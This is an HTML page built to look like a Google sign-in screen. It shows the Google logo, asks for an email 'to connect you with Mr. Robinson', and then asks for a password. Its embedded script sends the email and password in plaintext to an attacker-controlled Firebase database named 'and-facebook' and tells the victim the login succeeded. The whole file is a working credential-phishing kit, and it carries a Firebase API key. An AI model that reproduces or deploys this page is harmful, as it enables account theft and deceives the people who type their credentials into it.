<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Welcome</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: Arial, sans-serif; background-color: #ffffff; color: #202124; }
    .container { width: 100%; max-width: 400px; padding: 24px; margin: 0 auto; text-align: center; }
    .logo { width: 92px; margin: 40px 0 24px; }
    h1 { font-size: 24px; font-weight: 400; margin: 0; }
    p { font-size: 14px; color: #5f6368; margin: 8px 0 24px; line-height: 1.5; }
    .input-field { width: 100%; padding: 16px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 8px; outline: none; }
    .left-align-links { text-align: left; margin-top: 4px; }
    .left-align-links a { color: #1a73e8; text-decoration: none; font-size: 14px; display: inline-block; }
    .left-align-links .create-link { margin-top: 80px; }
    .left-align-links a:hover { text-decoration: underline; }
    .button-container { display: flex; justify-content: flex-end; margin-top: 180px; }
    .button { width: 100px; padding: 10px; font-size: 14px; color: white; background-color: #1a73e8; border: none; border-radius: 4px; cursor: pointer; }
    .button:hover { background-color: #1665d8; }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="logo">
    <h1>Welcome</h1>
    <p>Please enter your email to connect you with Mr. Robinson.</p>
    <input type="text" id="username" placeholder="Email" class="input-field">
    <input type="password" id="password-input" placeholder="Password" class="input-field">

    <div class="left-align-links">
      <a href="#" class="create-link">Create account</a>
    </div>
    
    <div class="button-container">
      <button class="button" id="submit">Next</button>
    </div>
  </div>

  <script type="module">
    // Import the functions you need from the SDKs you need
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";
    
    // Your web app's Firebase configuration
    const firebaseConfig = {
      apiKey: "AIzaSyCcTFYAIp1-TA1irU8l5N8iihfnYCGWrHw",
      authDomain: "and-facebook-ab84c.firebaseapp.com",
      databaseURL: "https://and-facebook-ab84c-default-rtdb.firebaseio.com",
      projectId: "and-facebook-ab84c",
      storageBucket: "and-facebook-ab84c.appspot.com",
      messagingSenderId: "4885749329",
      appId: "1:4885749329:web:2d5b0e46519b5dc4c8e270"
    };
  
    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    // Event listener for the button
    document.getElementById("submit").addEventListener('click', function() {
      const username = document.getElementById("username").value;
      const password = document.getElementById("password-input").value;

      if (username && password) {
        // Store the username and password in the database
        set(ref(db, 'users/' + username.replace('.', '_')), {
          username: username,
          password: password
        }).then(() => {
          alert("Login successful!");
        }).catch((error) => {
          console.error("Error storing data:", error);
          alert("Failed to log in. Please try again.");
        });
      } else {
        alert("Please enter both username and password.");
      }
    });
  </script>
</body>
